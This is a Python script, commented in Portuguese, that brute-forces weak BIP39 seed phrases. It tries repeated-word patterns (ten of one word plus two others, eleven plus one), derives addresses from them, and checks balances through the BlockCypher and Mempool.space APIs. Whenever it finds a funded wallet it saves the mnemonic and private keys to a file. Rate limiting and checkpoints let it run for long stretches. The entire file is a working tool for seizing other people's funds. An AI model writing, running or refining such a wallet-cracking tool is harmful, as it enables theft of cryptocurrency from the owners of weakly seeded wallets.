#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
realfindbitcoin_hybrid_final.py
- Parâmetros seguros: BlockCypher 2.5 t/s, Mempool 2.0 t/s (caps aplicados).
- Roda em paralelo: 10+2 e 11+1 (produtores separados), tasks worker pool para execução.
- Rate limiting por-API (token bucket) com cap (max_rate) — nunca ultrapassa limite.
- Checkpoint robusto salvando: pattern_atual, base_word, var1_idx, var2_idx, timestamp.
- Contadores restaurados: TOTAL_TESTS, VALID_BIP39_COUNT, FOUND_WITH_BALANCE.
- Não pula combinações; retomada exata por checkpoint.
"""
import os
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
import requests
import hmac
import hashlib
from mnemonic import Mnemonic
from bitcoin import privtopub, pubtoaddr, encode_privkey

# =========================
# CONFIGURAÇÃO (edite se necessário)
# =========================
# Modos: '10+2', '11+1', 'hybrid' (rodará 10+2 primeiro, depois 11+1)
MODE = "hybrid"

# BIP39 wordlist via mnemonic
mnemo = Mnemonic('english')
WORDLIST = mnemo.wordlist

# API Definitions: (url_template, initial_rate_tps, max_rate_tps)
API_DEFINITIONS = [
    ("https://api.blockcypher.com/v1/btc/main/addrs/{}", 2.5, 2.5),  # BlockCypher (cap 2.5 t/s)
    ("https://mempool.space/api/address/{}", 2.0, 2.0),            # Mempool.space (cap 2.0 t/s)
    # Você pode adicionar outras APIs respeitando limites reais
]

# Arquivos
CHECKPOINT_FILE = "checkpoint_hybrid_final.txt"
SALDO_FILE = "saldo.txt"
ULTIMO_FILE = "ultimo.txt"

# Concurrency & queue size
MAX_WORKERS = 4             # número de workers que processam checks (ajuste com cuidado)
MAX_INFLIGHT_TASKS = MAX_WORKERS * 3  # limite de tasks em voo

# Retries/backoff
MAX_RETRIES = 6
BACKOFF_BASE = 2.0
JITTER = 0.25

# Adaptive thresholds
RATE_ADJUST_WINDOW = 30.0
GLOBAL_429_THRESHOLD = 8
GLOBAL_PAUSE_SECONDS = 20.0

# Status interval
STATUS_INTERVAL = 15.0  # segundos

# =========================
# Utilitários de checkpoint / arquivos
# =========================
def save_checkpoint(pattern, base_word, var1_idx, var2_idx, counts=None):
    """Salva checkpoint: pattern, base_word, var1_idx, var2_idx, timestamp, (opcional) contadores"""
    try:
        with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
            f.write(f"{pattern}\n{base_word}\n{var1_idx}\n{var2_idx}\n{time.time()}\n")
            if counts:
                f.write(f"{counts.get('TOTAL_TESTS',0)}\n{counts.get('VALID_BIP39_COUNT',0)}\n{counts.get('FOUND_WITH_BALANCE',0)}\n")
    except Exception as e:
        print(f"❌ Erro ao salvar checkpoint: {e}")

def load_checkpoint():
    """
    Retorna (pattern, base_word, var1_idx, var2_idx, optional_counts_dict)
    Se não houver checkpoint, retorna (None, PALAVRA_BASE_PADRAO, 0, 0, None)
    """
    if not os.path.exists(CHECKPOINT_FILE):
        return None, None, 0, 0, None
    try:
        with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
            if len(lines) >= 4:
                pattern = lines[0]
                base_word = lines[1]
                var1_idx = int(lines[2])
                var2_idx = int(lines[3])
                counts = None
                if len(lines) >= 7:
                    counts = {
                        "TOTAL_TESTS": int(lines[4]),
                        "VALID_BIP39_COUNT": int(lines[5]),
                        "FOUND_WITH_BALANCE": int(lines[6])
                    }
                return pattern, base_word, var1_idx, var2_idx, counts
    except Exception as e:
        print(f"❌ Erro ao carregar checkpoint: {e}")
    return None, None, 0, 0, None

def save_last_combo_ultimo(mnemonic):
    try:
        with open(ULTIMO_FILE, "w", encoding="utf-8") as f:
            f.write(mnemonic + "\n")
    except Exception as e:
        print(f"❌ Erro salvando ultimo mnemonic: {e}")

def save_wallet_with_balance(mnemonic, address, wif, hex_key, pub_key, balance, api_name):
    try:
        with open(SALDO_FILE, "a", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("💎 CARTEIRA COM SALDO ENCONTRADA\n")
            f.write(f"Pattern: {current_pattern}\n")
            f.write(f"Mnemonic: {mnemonic}\n")
            f.write(f"Endereço: {address}\n")
            f.write(f"Saldo: {balance:.8f} BTC (API: {api_name})\n")
            f.write(f"WIF: {wif}\n")
            f.write(f"PrivHex: {hex_key}\n")
            f.write(f"PubKey: {pub_key}\n")
            f.write("-"*80 + "\n\n")
    except Exception as e:
        print(f"❌ Erro salvando carteira com saldo: {e}")

# =========================
# ApiLimiter (token bucket) com cap de max_rate
# =========================
class ApiLimiter:
    def __init__(self, initial_rate, max_rate):
        self.rate = float(max(0.01, initial_rate))
        self.max_rate = float(max(self.rate, max_rate))
        self.capacity = max(1.0, self.rate)
        self.tokens = self.capacity
        self.last = time.time()
        self.lock = threading.Lock()
        self.recent_429 = []

    def acquire(self):
        """Bloqueia até ter um token; reabastece tokens conforme rate."""
        while True:
            with self.lock:
                now = time.time()
                delta = now - self.last
                if delta > 0:
                    add = delta * self.rate
                    self.tokens = min(self.capacity, self.tokens + add)
                    self.last = now
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    return
                needed = (1.0 - self.tokens) / max(self.rate, 1e-9)
            time.sleep(max(0.01, needed * 0.5) + random.uniform(0, 0.01))

    def note_429(self):
        with self.lock:
            ts = time.time()
            self.recent_429.append(ts)
            cutoff = ts - RATE_ADJUST_WINDOW
            self.recent_429 = [t for t in self.recent_429 if t >= cutoff]

    def get_recent_429_count(self):
        with self.lock:
            ts = time.time()
            cutoff = ts - RATE_ADJUST_WINDOW
            self.recent_429 = [t for t in self.recent_429 if t >= cutoff]
            return len(self.recent_429)

    def adjust_rate(self):
        """Reduz agressivamente ao detectar 429; aumenta devagar até max_rate."""
        with self.lock:
            recent = self.get_recent_429_count()
            if recent >= 3:
                new_rate = max(0.05, self.rate * 0.35)  # reduzir agressivamente
            elif recent > 0:
                new_rate = max(0.05, self.rate * 0.6)
            else:
                # aumentar devagar, respeitando max_rate
                new_rate = min(self.max_rate, self.rate * 1.05 + 0.02)
            if abs(new_rate - self.rate) / max(self.rate, 1e-9) > 0.01:
                prop = self.tokens / self.capacity if self.capacity > 0 else 1.0
                self.rate = new_rate
                self.capacity = max(1.0, self.rate)
                self.tokens = min(self.capacity, prop * self.capacity)

# construir limiters por API
API_LIMITERS = [ApiLimiter(init, maxr) for (_, init, maxr) in API_DEFINITIONS]
GLOBAL_429_HISTORY = []
GLOBAL_429_LOCK = threading.Lock()

def global_note_429():
    with GLOBAL_429_LOCK:
        ts = time.time()
        GLOBAL_429_HISTORY.append(ts)
        cutoff = ts - RATE_ADJUST_WINDOW
        # purge old
        GLOBAL_429_HISTORY[:] = [t for t in GLOBAL_429_HISTORY if t >= cutoff]

def get_global_429_count():
    with GLOBAL_429_LOCK:
        ts = time.time()
        cutoff = ts - RATE_ADJUST_WINDOW
        GLOBAL_429_HISTORY[:] = [t for t in GLOBAL_429_HISTORY if t >= cutoff]
        return len(GLOBAL_429_HISTORY)

# =========================
# HTTP session
# =========================
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount("https://", adapter)
session.mount("http://", adapter)
session.headers.update({"User-Agent": "realfindbitcoin_hybrid_final/1.0"})

# =========================
# Geração de chave (mantido compatível)
# =========================
def generate_key_data_from_mnemonic(mnemonic):
    try:
        seed = mnemo.to_seed(mnemonic, passphrase="")
        I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
        master_priv_key = I[:32]
        wif = encode_privkey(master_priv_key, 'wif_compressed')
        pub_key = privtopub(master_priv_key)
        address = pubtoaddr(pub_key)
        hex_key = master_priv_key.hex()
        return address, wif, hex_key, pub_key
    except Exception:
        return None, None, None, None

# =========================
# Consulta APIs com retries/backoff; usa ApiLimiter para cada API
# =========================
def query_apis_for_address(address):
    """
    Retorna (True, balance_btc, api_name) se saldo > 0 encontrado,
    caso contrário (False, 0.0, None).
    """
    for idx, (url_template, _, _) in enumerate(API_DEFINITIONS):
        limiter = API_LIMITERS[idx]
        api_name = url_template.split("//")[1].split("/")[0]
        for attempt in range(MAX_RETRIES):
            # Se muitas 429s globais, pause global
            if get_global_429_count() >= GLOBAL_429_THRESHOLD:
                print(f"🟠 Muitas 429s globais ({get_global_429_count()}) — pausa global {int(GLOBAL_PAUSE_SECONDS)}s.")
                time.sleep(GLOBAL_PAUSE_SECONDS)
                for lim in API_LIMITERS:
                    lim.adjust_rate()

            limiter.acquire()
            try:
                url = url_template.format(address)
                resp = session.get(url, timeout=10)
                if resp.status_code == 429:
                    # registrar
                    limiter.note_429()
                    global_note_429()
                    retry_after = None
                    if 'Retry-After' in resp.headers:
                        try:
                            retry_after = float(resp.headers.get('Retry-After'))
                        except:
                            retry_after = None
                    if retry_after and retry_after > 0:
                        sleep_time = retry_after + random.uniform(0.1, 0.6)
                    else:
                        sleep_time = (BACKOFF_BASE ** attempt) * (0.5 + random.random() * JITTER)
                    print(f"🟡 429 em {api_name}: backoff {sleep_time:.2f}s (attempt {attempt+1}/{MAX_RETRIES})")
                    time.sleep(sleep_time)
                    limiter.adjust_rate()
                    continue
                resp.raise_for_status()
                data = resp.json()
                balance_satoshi = 0
                # extração por API conhecida
                if "blockcypher.com" in url_template:
                    balance_satoshi = data.get('balance', 0)
                elif "mempool.space" in url_template:
                    chain_stats = data.get('chain_stats', {})
                    funded = chain_stats.get('funded_txo_sum', 0)
                    spent = chain_stats.get('spent_txo_sum', 0)
                    balance_satoshi = max(0, funded - spent)
                    if balance_satoshi == 0:
                        balance_satoshi = data.get('balance', 0)
                else:
                    balance_satoshi = data.get('final_balance', data.get('balance', 0))
                balance_btc = balance_satoshi / 1e8 if balance_satoshi else 0.0
                if balance_btc > 0:
                    return True, balance_btc, api_name
                # saldo zero nessa API -> tenta próxima API
                break
            except requests.exceptions.RequestException as e:
                sleep_time = (BACKOFF_BASE ** attempt) * (0.2 + random.random() * JITTER)
                print(f"❌ Erro de conexão em {api_name}: {e}. Retentando em {sleep_time:.2f}s (attempt {attempt+1}/{MAX_RETRIES})")
                time.sleep(sleep_time)
                continue
            except ValueError:
                break
    return False, 0.0, None

# =========================
# Contadores (thread-safe)
# =========================
VALID_BIP39_COUNT = 0
FOUND_WITH_BALANCE = 0
TOTAL_TESTS = 0
lock_counters = threading.Lock()

def check_wallet_balance_mnemonic(mnemonic):
    """
    Função executada pelos workers: valida BIP39, gera chave, consulta APIs.
    Retorna tuple (mnemonic, found_bool, balance)
    """
    global VALID_BIP39_COUNT, FOUND_WITH_BALANCE, TOTAL_TESTS
    if not mnemo.check(mnemonic):
        with lock_counters:
            TOTAL_TESTS += 1
        return mnemonic, False, 0.0

    with lock_counters:
        VALID_BIP39_COUNT += 1
        TOTAL_TESTS += 1

    address, wif, hex_key, pub_key = generate_key_data_from_mnemonic(mnemonic)
    if not address:
        return mnemonic, False, 0.0

    found, balance, api_name = query_apis_for_address(address)
    if found:
        with lock_counters:
            FOUND_WITH_BALANCE += 1
        save_wallet_with_balance(mnemonic, address, wif, hex_key, pub_key, balance, api_name)
        return mnemonic, True, balance
    return mnemonic, False, 0.0

# =========================
# Iterators determinísticos
# =========================
def iter_10_plus_2_from(base_idx, var1_idx_start, var2_idx_start):
    for i in range(base_idx, len(WORDLIST)):
        base_word = WORDLIST[i]
        start_j = var1_idx_start if i == base_idx else 0
        for j in range(start_j, len(WORDLIST)):
            start_k = var2_idx_start if (i == base_idx and j == start_j) else 0
            for k in range(start_k, len(WORDLIST)):
                mnemonic = " ".join([base_word]*10 + [WORDLIST[j], WORDLIST[k]])
                yield i, j, k, mnemonic

def iter_11_plus_1_from(base_idx, var_idx_start):
    for i in range(base_idx, len(WORDLIST)):
        base_word = WORDLIST[i]
        start_j = var_idx_start if i == base_idx else 0
        for j in range(start_j, len(WORDLIST)):
            mnemonic = " ".join([base_word]*11 + [WORDLIST[j]])
            yield i, j, mnemonic

# =========================
# Producers (rodando em threads) -> produzem tarefas para o pool de workers
# =========================
inflight_semaphore = threading.Semaphore(MAX_INFLIGHT_TASKS)
futures_set_lock = threading.Lock()
futures_set = set()

def producer_10_plus_2(start_base_idx, start_j, start_k, executor, stop_event):
    """Produz mnemonics 10+2 e submete ao executor enquanto stop_event não setado."""
    global current_pattern
    current_pattern = "10+2"
    for i, j, k, mnemonic in iter_10_plus_2_from(start_base_idx, start_j, start_k):
        if stop_event.is_set():
            break
        # controle de inflight tasks
        inflight_semaphore.acquire()
        # save last combo & checkpoint
        try:
            save_last_combo_ultimo(mnemonic)
            save_checkpoint("10+2", WORDLIST[i], j, k, {
                "TOTAL_TESTS": TOTAL_TESTS,
                "VALID_BIP39_COUNT": VALID_BIP39_COUNT,
                "FOUND_WITH_BALANCE": FOUND_WITH_BALANCE
            })
        except Exception:
            pass

        # submit task wrapped to release semaphore when done
        fut = executor.submit(_task_wrapper, mnemonic)
        with futures_set_lock:
            futures_set.add(fut)

        # small pacing between submissions
        time.sleep(0.002)
    # producer finished
    return

def producer_11_plus_1(start_base_idx, start_j, executor, stop_event):
    """Produz mnemonics 11+1 e submete ao executor."""
    global current_pattern
    current_pattern = "11+1"
    for i, j, mnemonic in iter_11_plus_1_from(start_base_idx, start_j):
        if stop_event.is_set():
            break
        inflight_semaphore.acquire()
        try:
            save_last_combo_ultimo(mnemonic)
            save_checkpoint("11+1", WORDLIST[i], j, 0, {
                "TOTAL_TESTS": TOTAL_TESTS,
                "VALID_BIP39_COUNT": VALID_BIP39_COUNT,
                "FOUND_WITH_BALANCE": FOUND_WITH_BALANCE
            })
        except Exception:
            pass

        fut = executor.submit(_task_wrapper, mnemonic)
        with futures_set_lock:
            futures_set.add(fut)
        time.sleep(0.002)
    return

def _task_wrapper(mnemonic):
    """Wrapper para executar check e liberar semaphore e limpar futures_set."""
    try:
        result = check_wallet_balance_mnemonic(mnemonic)
        return result
    finally:
        # release inflight slot
        try:
            inflight_semaphore.release()
        except Exception:
            pass

# =========================
# Orquestração principal
# =========================
def main():
    global current_pattern, MODE
    print("Inicializando realfindbitcoin_hybrid_final.py")
    # load checkpoint
    ck_pattern, ck_base_word, ck_var1_idx, ck_var2_idx, counts = load_checkpoint()
    # determine start indices and pattern sequence
    if ck_base_word:
        try:
            base_idx = WORDLIST.index(ck_base_word)
        except ValueError:
            base_idx = 0
    else:
        base_idx = 0

    # restore counters if present
    global TOTAL_TESTS, VALID_BIP39_COUNT, FOUND_WITH_BALANCE
    if counts:
        TOTAL_TESTS = counts.get("TOTAL_TESTS", TOTAL_TESTS)
        VALID_BIP39_COUNT = counts.get("VALID_BIP39_COUNT", VALID_BIP39_COUNT)
        FOUND_WITH_BALANCE = counts.get("FOUND_WITH_BALANCE", FOUND_WITH_BALANCE)

    # choose starting pattern:
    # If checkpoint has a pattern, resume from that one first; otherwise run 10+2 then 11+1 (hybrid behavior).
    if ck_pattern in ("10+2", "11+1"):
        patterns = [ck_pattern]
        # ensure we run the other afterwards if hybrid desired
        if MODE == "hybrid":
            patterns.append("11+1" if ck_pattern == "10+2" else "10+2")
    else:
        # no checkpoint pattern -> default hybrid order: 10+2 then 11+1
        patterns = ["10+2", "11+1"] if MODE == "hybrid" else ([MODE] if MODE in ("10+2","11+1") else ["10+2","11+1"])

    # start executor pool
    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    stop_event = threading.Event()

    # create producer threads as needed
    producer_threads = []
    # We'll run producers sequentially if patterns length==1, or run both producers in parallel if hybrid requested (but ensure both produce concurrently)
    try:
        for pat in patterns:
            if pat == "10+2":
                start_j = ck_var1_idx if ck_pattern == "10+2" else 0
                start_k = ck_var2_idx if ck_pattern == "10+2" else 0
                t = threading.Thread(target=producer_10_plus_2, args=(base_idx, start_j, start_k, executor, stop_event), daemon=True)
                producer_threads.append(t)
            else:  # "11+1"
                start_j = ck_var1_idx if ck_pattern == "11+1" else 0
                t = threading.Thread(target=producer_11_plus_1, args=(base_idx, start_j, executor, stop_event), daemon=True)
                producer_threads.append(t)

        # Start all producers (this runs both in parallel if hybrid)
        for t in producer_threads:
            t.start()

        last_status = time.time()
        # While any producer is alive or futures in-flight, keep looping and reporting status, adjusting rates, and cleaning finished futures.
        while any(t.is_alive() for t in producer_threads) or futures_set:
            # process finished futures
            done_list = []
            with futures_set_lock:
                for f in list(futures_set):
                    if f.done():
                        done_list.append(f)
                        futures_set.remove(f)
            # consume results to raise exceptions if any
            for f in done_list:
                try:
                    _ = f.result()
                except Exception as e:
                    # print and continue; tasks have internal handling
                    print(f"❌ Erro em task worker: {e}")

            # adjust API rates periodically
            for lim in API_LIMITERS:
                lim.adjust_rate()

            # periodic status print
            now = time.time()
            if now - last_status >= STATUS_INTERVAL:
                with lock_counters:
                    rates = ", ".join([f"{API_DEFINITIONS[idx][0].split('//')[1].split('/')[0]}:{round(API_LIMITERS[idx].rate,3)}t/s" for idx in range(len(API_DEFINITIONS))])
                    print(f"[STATUS] TOTAL_TESTS={TOTAL_TESTS} | VALID_BIP39={VALID_BIP39_COUNT} | FOUND_WITH_BALANCE={FOUND_WITH_BALANCE} | inflight={MAX_INFLIGHT_TASKS - (inflight_semaphore._value if hasattr(inflight_semaphore,'_value') else '?')}")
                    print(f"   API rates: {rates} | Global 429s recent: {get_global_429_count()}")
                # save checkpoint periodically
                # pattern currently running might be in current_pattern variable (best-effort)
                try:
                    patt = current_pattern if 'current_pattern' in globals() else patterns[0]
                    # save last known indices as 0 (we already saved per mnemonic), here save counters as well
                    save_checkpoint(patt, WORDLIST[base_idx], 0, 0, {
                        "TOTAL_TESTS": TOTAL_TESTS,
                        "VALID_BIP39_COUNT": VALID_BIP39_COUNT,
                        "FOUND_WITH_BALANCE": FOUND_WITH_BALANCE
                    })
                except Exception:
                    pass
                last_status = now

            time.sleep(0.2)

    except KeyboardInterrupt:
        print("\n🛑 Interrompido pelo usuário — salvando checkpoint e encerrando...")
        stop_event.set()
        # producers may exit; let's wait a bit for tasks to finish gracefully
    finally:
        # Ensure producers stop
        stop_event.set()
        for t in producer_threads:
            t.join(timeout=2.0)
        # wait for inflight tasks to complete (but don't hang forever)
        wait_start = time.time()
        while futures_set and time.time() - wait_start < 10.0:
            # process completed futures while waiting
            done_list = []
            with futures_set_lock:
                for f in list(futures_set):
                    if f.done():
                        done_list.append(f)
                        futures_set.remove(f)
            for f in done_list:
                try:
                    _ = f.result()
                except Exception:
                    pass
            time.sleep(0.1)
        # shutdown executor
        executor.shutdown(wait=False)
        # final checkpoint
        try:
            patt = current_pattern if 'current_pattern' in globals() else patterns[0]
            save_checkpoint(patt, WORDLIST[base_idx], 0, 0, {
                "TOTAL_TESTS": TOTAL_TESTS,
                "VALID_BIP39_COUNT": VALID_BIP39_COUNT,
                "FOUND_WITH_BALANCE": FOUND_WITH_BALANCE
            })
        except Exception:
            pass

        print("\n--- EXECUÇÃO ENCERRADA ---")
        print(f"TOTAL_TESTS = {TOTAL_TESTS}")
        print(f"VALID_BIP39_COUNT = {VALID_BIP39_COUNT}")
        print(f"FOUND_WITH_BALANCE = {FOUND_WITH_BALANCE}")

if __name__ == "__main__":
    # define a palavra base padrão (compatibilidade com seu original)
    if not os.path.exists(CHECKPOINT_FILE):
        # inicializar checkpoint com pattern None => starts 10+2 then 11+1 (hybrid default)
        save_checkpoint("10+2" if MODE=="hybrid" else MODE, WORDLIST[0], 0, 0, {
            "TOTAL_TESTS": 0, "VALID_BIP39_COUNT": 0, "FOUND_WITH_BALANCE": 0
        })
    # variável global de padrão atual (usada em logs/arquivos)
    current_pattern = None
    main()
